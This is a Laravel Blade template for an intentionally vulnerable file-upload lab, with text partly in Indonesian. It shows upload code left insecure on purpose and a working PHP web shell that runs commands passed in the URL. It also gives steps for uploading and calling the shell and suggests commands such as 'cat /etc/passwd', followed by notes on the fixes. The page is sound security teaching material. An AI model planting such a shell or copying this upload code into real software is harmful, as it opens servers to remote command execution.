@extends('layouts.app')

@section('title', 'Level 1: No Validation')

@section('content')
<div class="container-fluid py-4">
    {{-- Header --}}
    <div class="d-flex justify-content-between align-items-center mb-4">
        <div>
            <h2 class="mb-1">
                <span class="badge bg-danger me-2">Level 1</span>
                No Validation
            </h2>
            <p class="text-muted mb-0">Tidak ada validasi sama sekali - RCE langsung!</p>
        </div>
        <div>
            <a href="{{ route('file-upload-lab.vulnerable.index') }}" class="btn btn-outline-secondary">
                <i class="bi bi-arrow-left"></i> Back to Lab
            </a>
        </div>
    </div>

    <div class="row">
        {{-- Upload Form --}}
        <div class="col-lg-6 mb-4">
            <div class="card border-danger">
                <div class="card-header bg-danger text-white">
                    <h5 class="mb-0"><i class="bi bi-cloud-upload"></i> Vulnerable Upload Form</h5>
                </div>
                <div class="card-body">
                    <form action="{{ route('file-upload-lab.vulnerable.level1') }}" method="POST" enctype="multipart/form-data">
                        @csrf

                        <div class="mb-3">
                            <label class="form-label">Select File to Upload</label>
                            <input type="file" name="file" class="form-control" required>
                            <div class="form-text text-danger">
                                <i class="bi bi-exclamation-triangle"></i>
                                No validation! Any file type accepted.
                            </div>
                        </div>

                        <button type="submit" class="btn btn-danger">
                            <i class="bi bi-upload"></i> Upload File
                        </button>
                    </form>

                    @if(isset($message))
                        <div class="alert alert-success mt-3 mb-0">
                            <i class="bi bi-check-circle"></i> {{ $message }}
                            @if(isset($fileUrl))
                                <br>
                                <strong>URL:</strong>
                                <a href="{{ $fileUrl }}" target="_blank">{{ $fileUrl }}</a>
                            @endif
                        </div>
                    @endif
                </div>
            </div>

            {{-- Vulnerable Code --}}
            <div class="card mt-4">
                <div class="card-header bg-dark text-white">
                    <h6 class="mb-0"><i class="bi bi-code-slash"></i> Vulnerable Code</h6>
                </div>
                <div class="card-body bg-dark">
<pre class="text-light mb-0 small"><code><span class="text-secondary">// VulnerableUploadController.php</span>

<span class="text-primary">public function</span> <span class="text-info">level1</span>(Request $request)
{
    $file = $request->file(<span class="text-success">'file'</span>);

    <span class="text-secondary">// VULNERABLE: No validation!</span>
    <span class="text-secondary">// Stores in public directory with original name</span>
    $filename = $file->getClientOriginalName();
    $file->move(public_path(<span class="text-success">'uploads/vulnerable'</span>), $filename);

    <span class="text-secondary">// Attacker can access: /uploads/vulnerable/shell.php</span>
}</code></pre>
                </div>
            </div>
        </div>

        {{-- Attack Instructions --}}
        <div class="col-lg-6 mb-4">
            <div class="card border-warning h-100">
                <div class="card-header bg-warning text-dark">
                    <h5 class="mb-0"><i class="bi bi-book"></i> Attack Instructions</h5>
                </div>
                <div class="card-body">
                    <h6>Step 1: Create PHP Shell</h6>
                    <p class="small">Buat file <code>shell.php</code> dengan konten:</p>
                    <div class="bg-dark text-light p-2 rounded small mb-3">
<pre class="mb-0"><code>&lt;?php
if(isset($_GET['cmd'])) {
    echo '&lt;pre&gt;';
    system($_GET['cmd']);
    echo '&lt;/pre&gt;';
}
?&gt;</code></pre>
                    </div>

                    <h6>Step 2: Upload Shell</h6>
                    <p class="small">Upload file <code>shell.php</code> menggunakan form di sebelah kiri.</p>

                    <h6>Step 3: Execute Commands</h6>
                    <p class="small">Akses shell dengan command di URL:</p>

                    <div class="bg-dark p-2 rounded small mb-3">
                        <code class="text-info">/uploads/vulnerable/shell.php?cmd=whoami</code>
                    </div>

                    <h6>Commands to Try:</h6>
                    <div class="table-responsive">
                        <table class="table table-sm table-bordered small mb-0">
                            <thead class="table-secondary">
                                <tr>
                                    <th>Command</th>
                                    <th>OS</th>
                                    <th>Result</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td><code>whoami</code></td>
                                    <td>Both</td>
                                    <td>Current user</td>
                                </tr>
                                <tr>
                                    <td><code>id</code></td>
                                    <td>Linux</td>
                                    <td>User ID & groups</td>
                                </tr>
                                <tr>
                                    <td><code>pwd</code> / <code>cd</code></td>
                                    <td>Linux / Win</td>
                                    <td>Current directory</td>
                                </tr>
                                <tr>
                                    <td><code>ls -la</code> / <code>dir</code></td>
                                    <td>Linux / Win</td>
                                    <td>List files</td>
                                </tr>
                                <tr>
                                    <td><code>cat /etc/passwd</code></td>
                                    <td>Linux</td>
                                    <td>System users</td>
                                </tr>
                            </tbody>
                        </table>
                    </div>

                    @if(isset($fileUrl) && str_ends_with($uploadedFile ?? '', '.php'))
                        <div class="alert alert-danger mt-3 mb-0">
                            <h6><i class="bi bi-terminal"></i> Quick Test Links:</h6>
                            <ul class="mb-0 small">
                                <li><a href="{{ $fileUrl }}?cmd=whoami" target="_blank" class="text-danger">{{ $fileUrl }}?cmd=whoami</a></li>
                                <li><a href="{{ $fileUrl }}?cmd=pwd" target="_blank" class="text-danger">{{ $fileUrl }}?cmd=pwd</a></li>
                                <li><a href="{{ $fileUrl }}?cmd=ls -la" target="_blank" class="text-danger">{{ $fileUrl }}?cmd=ls -la</a></li>
                            </ul>
                        </div>
                    @endif
                </div>
            </div>
        </div>
    </div>

    {{-- Why Vulnerable --}}
    <div class="card">
        <div class="card-header bg-secondary text-white">
            <h5 class="mb-0"><i class="bi bi-question-circle"></i> Mengapa Vulnerable?</h5>
        </div>
        <div class="card-body">
            <div class="row">
                <div class="col-md-6">
                    <h6 class="text-danger"><i class="bi bi-x-circle"></i> Problems:</h6>
                    <ul class="small">
                        <li><strong>No extension validation</strong> - Terima semua tipe file</li>
                        <li><strong>No MIME type check</strong> - Tidak cek Content-Type</li>
                        <li><strong>Original filename used</strong> - Rentan path traversal</li>
                        <li><strong>Stored in public directory</strong> - File bisa diakses langsung</li>
                        <li><strong>PHP files execute</strong> - Server eksekusi file PHP</li>
                    </ul>
                </div>
                <div class="col-md-6">
                    <h6 class="text-success"><i class="bi bi-check-circle"></i> Should Have:</h6>
                    <ul class="small">
                        <li>Whitelist allowed extensions</li>
                        <li>Validate MIME type from content</li>
                        <li>Generate random filename</li>
                        <li>Store outside public directory</li>
                        <li>Serve via controller with auth check</li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</div>
@endsection
